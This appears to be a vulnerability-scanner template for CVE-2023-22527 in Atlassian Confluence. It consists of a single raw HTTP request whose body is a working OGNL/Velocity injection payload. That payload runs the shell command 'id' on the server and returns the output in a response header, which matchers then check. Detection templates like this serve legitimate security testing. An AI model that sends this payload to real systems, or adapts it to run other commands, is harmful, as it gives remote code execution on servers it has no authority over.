id: poc-yaml-atlassian-confluence-rce
info:
  name: Atlassian Confluence Remote Code Execution (CVE-2023-22527)
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,CVE-2023-22527
http:
  - raw:
      - |
        POST /template/aui/text-inline.vm HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        label=aaa'\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('Cmd',(new+freemarker.template.utility.Execute()).exec({'id'}))
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "Cmd"
          - "uid="
          - "gid="
      - type: word
        part: body
        words:
          - "Confluence"
